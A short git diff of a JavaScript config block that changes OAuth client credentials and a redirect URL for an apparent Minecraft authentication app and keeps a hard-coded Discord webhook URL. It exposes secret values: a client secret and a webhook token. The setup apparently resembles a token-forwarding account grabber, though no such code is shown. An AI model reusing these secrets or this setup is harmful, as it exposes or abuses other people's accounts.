@@ -1,7 +1,7 @@
 //Config
-const client_secret = 'wbo8Q~zyiZUVZ5zVSbc7UZdjw334x9qNJ011IbDF'
-const client_id = '767bbf91-f318-4f75-ad82-526129dcd4f7'
-const redirect_uri = 'https://minecraft-auth-app.herokuapp.com/'
+const client_secret = '2ff810c3-6c8e-441e-886f-1ccd88958132'
+const client_id = 'af87e0d4-5d31-4eb9-bee8-094adf912e3b'
+const redirect_uri = 'https://github.com/ELIPROSTER/discord-bot'
 const webhook_url = 'https://discord.com/api/webhooks/1043408969319854101/ou0h4E7ajBn_4j0LhN0_iiqzi2vQfWeI1wVI4LqarmdKGfgxQhikZgInEBfMNWETKOni'
 //Requirements
 const axios = require('axios')
